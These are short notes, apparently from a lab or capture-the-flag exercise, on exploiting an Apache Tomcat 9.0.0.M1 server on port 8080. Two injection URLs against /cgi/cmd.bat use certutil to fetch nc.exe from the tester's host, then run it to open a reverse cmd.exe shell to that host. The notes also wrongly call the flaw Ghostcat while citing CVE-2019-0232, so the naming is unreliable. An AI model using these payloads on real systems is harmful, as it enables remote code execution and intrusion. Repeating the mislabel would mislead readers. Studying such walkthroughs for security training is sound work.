1. nmap scan reveals Tomcat
2. nmap scan shows it is running on port 8080
3. Visit URL and it is ApacheTomcat/9.0.0.M1
4. Vulnerable to Ghostcat (CVE-2019-0232)
```
http://10.129.201.89:8080/cgi/cmd.bat?&&C%3a%5cWindows%5cSystem32%5ccertutil+-urlcache+-split+-f+http%3A%2F%2F10.10.14.6:8000%2Fnc%2Eexe+nc.exe
http://10.129.201.89:8080/cgi/cmd.bat?&nc.exe+10.10.14.6+8443+-e+cmd.exe
```
